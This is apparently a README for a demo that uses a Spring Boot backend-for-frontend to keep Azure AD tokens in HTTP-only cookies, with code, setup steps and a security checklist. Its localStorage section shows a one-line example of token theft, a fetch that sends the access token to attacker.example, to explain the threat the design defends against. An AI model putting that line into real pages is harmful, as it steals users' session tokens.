<!-- Simplified README (previous detailed reference removed) -->
<br />

# MSAL Secure BFF Authentication Demo

A production-aligned example of Azure AD (Entra ID) authentication using the **Backend for Frontend (BFF)** pattern:

- **React** — SPA that never handles tokens
- **Spring Boot** — BFF that owns the entire OAuth 2.0 + PKCE flow
- **HTTP-only cookies** — the only thing the browser ever sees

> **Goal:** Demonstrate a secure, stateless, production-ready auth pattern with the minimum moving parts needed to understand it and adapt it to your own codebase.

---

## Why Not localStorage?

Storing tokens in `localStorage` or `sessionStorage` is a common mistake that makes your application vulnerable to **Cross-Site Scripting (XSS)**.

Any JavaScript running on your page — including injected scripts from a compromised npm dependency, a browser extension exploit, or a reflected XSS attack — can do:

```js
// Attacker's script silently exfiltrates your token
fetch("https://attacker.example/steal?token=" + localStorage.getItem("access_token"));
```

This is known as **Same-Site Scripting** when the injected script originates from the same origin (e.g., via a stored XSS vulnerability). Once stolen, the token can be replayed from any machine, anywhere in the world, until it expires.

**HTTP-only cookies cannot be read by JavaScript at all.** `document.cookie` does not expose them; `fetch`/`XMLHttpRequest` cannot read them. The browser sends them automatically on matching requests and that is the only way they travel. Combined with `SameSite` and `Secure` flags, this closes the token-theft attack surface entirely.

| Storage | Readable by JS | Stolen via XSS | CSRF risk |
|---|---|---|---|
| `localStorage` | ✅ Yes | ✅ Yes | ❌ No |
| `sessionStorage` | ✅ Yes | ✅ Yes | ❌ No |
| HTTP-only cookie | ❌ No | ❌ No | ⚠️ Mitigated by `SameSite` |

This project uses `SameSite=Strict` (production) or `SameSite=Lax` (development) to mitigate CSRF, making the HTTP-only cookie approach strictly safer than any JavaScript-accessible storage.

---

## Authentication Flow

The full flow is documented in [`docs/token-flow.puml`](docs/token-flow.puml) (open with any PlantUML viewer, e.g. the IntelliJ PlantUML plugin or [plantuml.com](https://www.plantuml.com/plantuml)).

Summarised:

```
┌─────────────┐  1. GET /auth/login  ┌──────────────────────────────────────────┐
│             │─────────────────────▶│                                          │
│   React     │                      │           Spring Boot BFF                │
│   (SPA)     │  2. 302 → Entra ID   │  • Generates PKCE verifier + challenge   │
│             │◀─────────────────────│  • Sets short-lived OAUTH_STATE +        │
│             │                      │    PKCE_VERIFIER cookies (SameSite=Lax)  │
│             │  3. Redirect back    └──────────────────────────────────────────┘
│             │     with auth code               │
│             │─────────────────────────────────▶│
│             │                                  │ 4. Validates CSRF state cookie
│             │                                  │ 5. Exchanges code+verifier
│             │                                  │    with Entra ID (server-side)
│             │                                  │ 6. Sets AUTH_TOKEN cookie
│             │  7. 302 → /?login=success        │    (HttpOnly, Secure, SameSite)
│             │◀─────────────────────────────────│
│             │                                  │
│             │  8. GET /api/hello               │
│             │     (cookie sent automatically)  │
│             │─────────────────────────────────▶│ 9. Validates JWT, populates
│             │                                  │    Spring Security context
│             │  10. JSON response               │
│             │◀─────────────────────────────────│
└─────────────┘                                  └─
```

Key properties:
- The **frontend never sees a token**. It only navigates to `/auth/login` and reads API responses.
- The **auth code exchange** happens server-to-server between the BFF and Entra ID.
- **Refresh tokens** live only in MSAL4J's server-side Redis cache — they never leave the backend.
- **No server-side session** is used. The MSAL account ID for silent refresh is derived from `oid`+`tid` claims in the JWT already stored in the cookie.
- **Redis** ensures the token cache is shared across all BFF replicas in an AKS cluster — each user's cache entry is isolated by `homeAccountId` (`oid.tid`).

---

## Key Code: Patterns to Adapt

### 1. Requesting a Token (Login + Callback)

The BFF initiates the OAuth 2.0 Authorization Code flow with PKCE. The PKCE verifier and OAuth state (CSRF token) are stored in short-lived `HttpOnly` cookies during the redirect — no server-side session needed.

**`AuthController.java`** — [`backend/src/main/java/com/example/msalbff/controller/AuthController.java`](backend/src/main/java/com/example/msalbff/controller/AuthController.java)

```java
// 1. Initiate login: generate PKCE + state, redirect browser to Entra ID
@GetMapping("/login")
public void startLogin(HttpServletResponse response) {
    String state = UUID.randomUUID().toString();
    authCookieService.setOAuthStateCookie(response, state);  // CSRF protection

    String codeVerifier = generateCodeVerifier();
    authCookieService.setPkceVerifierCookie(response, codeVerifier);

    String authUrl = tokenExchangeService.generateAuthorizationUrl(
        redirectUri, scopes, state, generateCodeChallenge(codeVerifier));
    response.sendRedirect(authUrl);
}

// 2. Handle the callback from Entra ID
@GetMapping("/callback")
public void callback(@RequestParam String code, @RequestParam String state,
                     HttpServletRequest request, HttpServletResponse response) {
    // Validate CSRF state from cookie
    String expectedState = authCookieService.getOAuthStateCookie(request);
    if (!expectedState.equals(state)) { /* reject */ }

    // Exchange the auth code for tokens (server-to-server, never exposed to browser)
    String codeVerifier = authCookieService.getPkceVerifierCookie(request);
    authCookieService.clearOAuthFlowCookies(response);

    IAuthenticationResult result = tokenExchangeService
        .exchangeAuthorizationCode(code, redirectUri, scopes, codeVerifier);

    // Store only the ID token in an HTTP-only cookie — access/refresh tokens stay server-side
    authCookieService.setAuthCookie(response, result.idToken());
    response.sendRedirect(frontend + "/?login=success");
}
```

On the frontend, login is simply a navigation — no token handling:

**`authService.js`** — [`frontend/src/services/authService.js`](frontend/src/services/authService.js)

```js
startLogin: () => {
    window.location.href = `${apiConfig.baseUrl}/auth/login`;
}
```

---

### 2. Using a Token (Authenticated API Calls)

The `CookieAuthenticationFilter` runs on every request. It reads the `AUTH_TOKEN` cookie, validates the JWT against Entra ID's JWK Set, and populates the Spring Security context. Protected endpoints just use `@PreAuthorize` or rely on the `SecurityContext` as normal.

**`CookieAuthenticationFilter.java`** — [`backend/src/main/java/com/example/msalbff/security/CookieAuthenticationFilter.java`](backend/src/main/java/com/example/msalbff/security/CookieAuthenticationFilter.java)

```java
@Override
protected void doFilterInternal(HttpServletRequest request,
                                HttpServletResponse response,
                                FilterChain filterChain) throws ServletException, IOException {
    String token = extractTokenFromCookie(request);

    if (token != null) {
        if (tokenValidationService.validateToken(token)) {
            Jwt jwt = tokenValidationService.parseToken(token);
            setAuthentication(jwt);          // Populates SecurityContext

            if (isExpiringSoon(jwt)) {
                tryRefreshToken(token, response);  // Proactive refresh
            }
        } else {
            tryRefreshToken(token, response);  // Expired — attempt silent refresh
        }
    }

    filterChain.doFilter(request, response);
}
```

On the frontend, `withCredentials: true` is the only config needed — the browser handles the rest:

```js
const api = axios.create({
    baseURL: apiConfig.baseUrl,
    withCredentials: true,  // Browser sends the HttpOnly cookie automatically
});

getHelloMessage: async () => api.get('/hello')
```

---

### 3. Refreshing a Token (Silent Refresh)

When the cookie's JWT is expired or within 5 minutes of expiry, the BFF silently acquires a new token using MSAL4J's cached refresh token. The MSAL account ID is derived from the `oid` and `tid` claims already in the JWT — no session or extra storage required.

**`CookieAuthenticationFilter.java`** — silent refresh logic:

```java
private void tryRefreshToken(String token, HttpServletResponse response) {
    String homeAccountId = extractHomeAccountId(token);  // Reads oid+tid from JWT claims
    if (homeAccountId == null) return;

    tokenExchangeService.acquireTokenSilently(homeAccountId, scopes).ifPresent(result -> {
        Jwt jwt = tokenValidationService.parseToken(result.idToken());
        setAuthentication(jwt);
        authCookieService.setAuthCookie(response, result.idToken());  // Refreshed cookie
    });
}

private String extractHomeAccountId(String token) {
    Jwt jwt = tokenValidationService.parseToken(token);  // Parse claims, no sig check needed
    String oid = jwt.getClaimAsString("oid");
    String tid = jwt.getClaimAsString("tid");
    return (oid != null && tid != null) ? oid + "." + tid : null;
}
```

**`TokenExchangeService.java`** — [`backend/src/main/java/com/example/msalbff/service/TokenExchangeService.java`](backend/src/main/java/com/example/msalbff/service/TokenExchangeService.java)

```java
public Optional<IAuthenticationResult> acquireTokenSilently(String homeAccountId, Set<String> scopes) {
    IAccount account = msalClient.getAccounts().join().stream()
        .filter(a -> homeAccountId.equals(a.homeAccountId()))
        .findFirst().orElse(null);

    if (account == null) return Optional.empty();  // User must re-authenticate

    SilentParameters parameters = SilentParameters.builder(scopes, account).build();
    IAuthenticationResult result = msalClient.acquireTokenSilently(parameters)
        .get(TOKEN_EXCHANGE_TIMEOUT_SECONDS, TimeUnit.SECONDS);
    return Optional.of(result);
}
```

---

### 4. Distributed Token Cache (Redis)

**Why the in-memory cache breaks in a cluster**

MSAL4J's default token cache is a plain Java `HashMap` inside the `ConfidentialClientApplication` instance. When you run a single backend pod this works fine, but in a horizontally-scaled deployment (AKS, Cloud Foundry, any replicated service):

```
Pod A  → login → cache contains refresh token for alice
Pod B  → next request from alice → cache is empty → silent refresh fails → 401
```

Every replica has its own in-memory island. Users whose requests land on a different pod after login either get a 401 or are forced to re-authenticate — unacceptable in production.

**Why Redis is the right fix**

Redis is a shared, low-latency key–value store. By implementing MSAL4J's `ITokenCacheAccessAspect` interface and backing it with Redis, every pod reads and writes the same cache:

```
Pod A  → login → Redis["msal:token-cache:oid.tid"] = <encrypted MSAL JSON>
Pod B  → next request → reads Redis["msal:token-cache:oid.tid"] → silent refresh succeeds
```

The cache entry is **keyed per user** using the `homeAccountId` (composite of Entra `oid` + `tid` claims), which means:
- Each user has an isolated cache entry — no cross-user cache leakage.
- App-level entries (client credential flows) use `msal:token-cache:app:{clientId}`.

**Security hardening applied**

| Concern | Mitigation |
|---|---|
| Token cache at rest | AES-256-GCM encryption with a per-entry random 12-byte IV (`TokenCacheEncryption.java`). Configured via `REDIS_ENCRYPTION_KEY` (32-byte base64). |
| Unencrypted-key warning | If `REDIS_ENCRYPTION_KEY` is not set, a `SECURITY WARN` is logged on startup and tokens are stored as plaintext — acceptable for dev, unacceptable for production. |
| Redis network exposure | Dev: Redis binds to `127.0.0.1` only (not `0.0.0.0`). Production: set `REDIS_TLS=true` to enable TLS/SSL via Lettuce. |
| Redis password | `requirepass` enforced in `docker-compose.yml`. Set `REDIS_PASSWORD` in `.env`. |
| Redis outage | Both `beforeCacheAccess` and `afterCacheAccess` are wrapped in try-catch. On a Redis failure the BFF falls back to an empty cache (forcing full token exchange) rather than throwing a 500. |
| Logout invalidation | `POST /auth/logout` reads the `AUTH_TOKEN` cookie, derives `homeAccountId`, and calls `RedisMsalTokenCache.evict()` to delete the Redis key immediately — no wait for TTL expiry. |

**`RedisMsalTokenCache.java`** — [`backend/src/main/java/com/example/msalbff/service/RedisMsalTokenCache.java`](backend/src/main/java/com/example/msalbff/service/RedisMsalTokenCache.java)

```java
@Override
public void beforeCacheAccess(ITokenCacheAccessContext context) {
    try {
        String key = partitionKey(context);
        String cached = redis.opsForValue().get(key);
        if (cached != null) {
            context.tokenCache().deserialize(encryption.decrypt(cached));
        }
    } catch (Exception e) {
        log.warn("Redis read failed — starting with empty MSAL cache: {}", e.getMessage());
    }
}

@Override
public void afterCacheAccess(ITokenCacheAccessContext context) {
    if (!context.hasCacheChanged()) return;
    try {
        String key = partitionKey(context);
        String serialized = encryption.encrypt(context.tokenCache().serialize());
        redis.opsForValue().set(key, serialized, properties.getRedis().getTtl());
    } catch (Exception e) {
        log.warn("Redis write failed — cache not persisted: {}", e.getMessage());
    }
}
```

The partition key is derived from `context.account()` when available (user flows) or falls back to the client ID (app-credential flows):

```java
private String partitionKey(ITokenCacheAccessContext context) {
    String suffix = context.account() != null
        ? context.account().homeAccountId()
        : APP_PARTITION_PREFIX + context.clientId();
    return CACHE_KEY_PREFIX + suffix;
}
```

---

## Project Structure

```
msal/
├── .env.example              ← Template — copy to .env and fill in values
├── configure.sh / .ps1       ← Generates config files from .env
├── runall.sh / .ps1          ← Full build + start both services (incl. Redis)
├── docker-compose.yml        ← Redis 7 (loopback-only, requirepass, AOF persistence)
├── docs/
│   └── token-flow.puml       ← Full auth flow diagram (PlantUML)
├── frontend/                 ← React SPA
│   └── src/
│       ├── config/msalConfig.js   ← Generated — do not edit
│       ├── services/authService.js
│       └── App.js
└── backend/                  ← Spring Boot BFF
    └── src/main/java/com/example/msalbff/
        ├── config/           ← AppProperties.java, RedisConfig.java
        ├── controller/       ← AuthController.java, SimpleApiController.java
        ├── security/         ← CookieAuthenticationFilter.java, SecurityConfig.java
        └── service/          ← TokenExchangeService.java, TokenValidationService.java,
                                 AuthCookieService.java, RedisMsalTokenCache.java,
                                 TokenCacheEncryption.java, LogSanitizer.java
```

Generated files (`msalConfig.js`, `application.properties`) are excluded from git. Always edit `.env`.

---

## Running Locally

### Prerequisites

- Java 17+ and Maven
- Node 18+
- Docker (for Redis)
- An Azure AD App Registration (see [Configuring the App Registration](#configuring-the-app-registration) below)

### Steps

**1. Clone and enter the repository**

```bash
git clone https://github.com/your-org/msal.git
cd msal
```

**2. Create and fill in your `.env` file**

```bash
cp .env.example .env
```

Open `.env` and set at minimum:

```dotenv
AZURE_CLIENT_ID=<your-application-client-id>
AZURE_TENANT_ID=<your-directory-tenant-id>
AZURE_CLIENT_SECRET=<your-client-secret>
```

**3. Build and start everything**

```bash
# macOS / Linux
./runall.sh

# Windows
./runall.ps1
```

This will:
1. Generate `frontend/src/config/msalConfig.js` and `backend/src/main/resources/application.properties` from your `.env`
2. Start Redis via `docker compose up -d redis` (requires Docker)
3. Install frontend npm dependencies
4. Build and test the backend with Maven
5. Open two Terminal windows — one for the backend (`:8080`), one for the frontend (`:3000`)

**4. Open the app**

Navigate to [http://localhost:3000](http://localhost:3000) and click **Sign In with Azure AD**.

### Configuration reference

All configuration lives in `.env`. Running `./configure.sh` (or `./configure.ps1`) at any time regenerates the derived config files without rebuilding.

| Variable | Dev default | Description |
|---|---|---|
| `AZURE_CLIENT_ID` | _(required)_ | Application (client) ID from App Registration |
| `AZURE_TENANT_ID` | _(required)_ | Directory (tenant) ID |
| `AZURE_CLIENT_SECRET` | _(required)_ | Client secret from App Registration |
| `FRONTEND_URL` | `http://localhost:3000` | SPA origin (used for CORS + redirect URI) |
| `BACKEND_URL` | `http://localhost:8080` | BFF origin |
| `COOKIE_SECURE` | `false` | Set to `true` when running over HTTPS |
| `COOKIE_SAME_SITE` | `Lax` | Use `Strict` in production |
| `LOG_LEVEL` | `DEBUG` | Set to `INFO` in production |
| `REDIS_HOST` | `localhost` | Redis hostname |
| `REDIS_PORT` | `6379` | Redis port (use `6380` for Azure Cache for Redis TLS) |
| `REDIS_PASSWORD` | `changeme-in-dev` | Redis AUTH password (`requirepass`) |
| `REDIS_TTL` | `90d` | Cache entry TTL (Spring Duration format: `90d`, `3600s`) |
| `REDIS_TLS` | `false` | Enable TLS/SSL — set `true` for Azure Cache for Redis |
| `REDIS_ENCRYPTION_KEY` | _(blank)_ | AES-256-GCM key: generate with `openssl rand -base64 32`. **Required for production.** |

---

## Configuring the App Registration

Create or update an App Registration in [Entra ID (Azure AD)](https://portal.azure.com/#view/Microsoft_AAD_RegisteredApps).

### 1. Register the application

- **Azure Portal** → **Microsoft Entra ID** → **App registrations** → **New registration**
- **Name:** anything descriptive (e.g. `msal-bff-demo`)
- **Supported account types:** _Accounts in this organizational directory only_ (single tenant) or _Any Azure AD directory_ (multi-tenant)
- **Redirect URI:** leave blank for now — you will add it below

### 2. Add the redirect URI

The redirect URI is where Entra ID sends the authorization code after login. In this BFF pattern the redirect goes to the **backend**, not the frontend.

- Go to **Authentication** → **Add a platform** → **Web**
- Add: `http://localhost:3000/api/auth/callback`

> In production replace `http://localhost:3000` with your actual frontend origin and `/api` with your backend context path. The redirect URI must exactly match the value generated in `application.properties` (`app.azure-ad.redirect-uri`).

### 3. Create a client secret

- Go to **Certificates & secrets** → **New client secret**
- Set an expiry and copy the **Value** immediately — it is only shown once
- Paste it into `.env` as `AZURE_CLIENT_SECRET`

### 4. Expose the required API permissions

- Go to **API permissions** → **Add a permission** → **Microsoft Graph** → **Delegated**
- Add: `openid`, `profile`, `email`, `offline_access`, `User.Read`
- Click **Grant admin consent** (required for `offline_access` which provides the refresh token)

### 5. Verify the token configuration

- Go to **Token configuration**
- Confirm the ID token includes the `oid` and `tid` optional claims (they are present by default for v2 tokens)

### Summary of values to copy into `.env`

| `.env` variable | Where to find it |
|---|---|
| `AZURE_CLIENT_ID` | App Registration **Overview** → Application (client) ID |
| `AZURE_TENANT_ID` | App Registration **Overview** → Directory (tenant) ID |
| `AZURE_CLIENT_SECRET` | **Certificates & secrets** → Value (copy at creation time) |

---

## Security Summary

| Aspect | Approach |
|---|---|
| **Token storage** | ID token in `HttpOnly` cookie only — never in JS-accessible storage |
| **XSS protection** | `HttpOnly` flag prevents JavaScript from reading the cookie |
| **CSRF protection** | `SameSite=Strict` (prod) / `SameSite=Lax` (dev) + `state` parameter check |
| **PKCE** | Code verifier stored in a short-lived `HttpOnly` cookie; never in JS |
| **Refresh tokens** | Server-side only (MSAL4J cache in Redis); never sent to browser |
| **Token cache at rest** | AES-256-GCM encryption in Redis (per-entry random IV); opt-in via `REDIS_ENCRYPTION_KEY` |
| **Token cache isolation** | Per-user Redis key (`msal:token-cache:{oid.tid}`); logout triggers immediate eviction |
| **Redis network** | Dev: loopback-only (`127.0.0.1`), `requirepass`. Prod: TLS via `REDIS_TLS=true` |
| **Token validation** | Signature verified against Entra ID JWK Set; `iss`, `aud`, `exp` checked |
| **Stateless backend** | No `HttpSession` used — `homeAccountId` derived from JWT `oid`+`tid` claims |

---

## API Endpoints

| Endpoint | Method | Auth | Purpose |
|---|---|---|---|
| `/api/health` | GET | No | Liveness check |
| `/api/auth/login` | GET | No | Initiates PKCE login flow, redirects to Entra ID |
| `/api/auth/callback` | GET | No | Receives auth code, exchanges for tokens, sets cookie |
| `/api/auth/logout` | POST | No | Expires the `AUTH_TOKEN` cookie |
| `/api/hello` | GET | ✅ | Sample protected endpoint |
| `/api/userinfo` | GET | ✅ | Returns claims from the validated JWT |

---

## Troubleshooting

| Symptom | Likely cause | Fix |
|---|---|---|
| Redirect loop after login | Redirect URI mismatch | Ensure `FRONTEND_URL + /api/auth/callback` matches exactly what is registered in Entra ID |
| `AADSTS50011` error | Redirect URI not registered | Add `http://localhost:3000/api/auth/callback` under **Authentication → Web** |
| `401` on protected endpoints | Cookie not sent or expired | Check `COOKIE_SECURE=false` for local HTTP; check CORS `allowCredentials` |
| CORS error | Origin mismatch | `FRONTEND_URL` in `.env` must match the browser's origin exactly |
| Cookie missing in dev tools | `HttpOnly` hides it from the JS console | Use the **Application → Cookies** tab in DevTools; it will be listed there |
| Silent refresh not working | `offline_access` scope missing or admin consent not granted | Add `offline_access` and grant admin consent in Entra ID |
| Backend restart loses sessions | Expected only if Redis is down | MSAL4J refresh tokens are stored in Redis and survive pod restarts. If Redis itself is unavailable, users must re-authenticate. |

---

## Production Checklist

- [ ] `COOKIE_SECURE=true` (requires HTTPS)
- [ ] `COOKIE_SAME_SITE=Strict`
- [ ] `LOG_LEVEL=INFO`
- [x] Distributed token cache backed by Redis (`RedisMsalTokenCache` implementing `ITokenCacheAccessAspect`)
- [ ] Set `REDIS_ENCRYPTION_KEY` to a random 32-byte base64 key (`openssl rand -base64 32`)
- [ ] Set `REDIS_TLS=true` and `REDIS_PORT=6380` for Azure Cache for Redis (TLS endpoint)
- [ ] Store `REDIS_ENCRYPTION_KEY`, `REDIS_PASSWORD`, and `AZURE_CLIENT_SECRET` in a secrets manager (e.g. Azure Key Vault)
- [ ] Set security headers: `Content-Security-Policy`, `Strict-Transport-Security`, `X-Content-Type-Options`
- [ ] Rotate client secrets regularly
- [ ] Enable Conditional Access policies and token protection in Entra ID

---

## Useful References

- [MSAL4J documentation](https://learn.microsoft.com/en-us/azure/active-directory/develop/msal-java-get-started)
- [OAuth 2.0 Authorization Code Flow with PKCE](https://learn.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-auth-code-flow)
- [Spring Security OAuth2 Resource Server](https://docs.spring.io/spring-security/reference/servlet/oauth2/resource-server/index.html)
- [OWASP: HTML5 Security — localStorage](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#local-storage)
- [OWASP: Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)

---

*Minimal surface. Clear responsibilities. Secure defaults.*

**Happy Authenticating!** 🔐
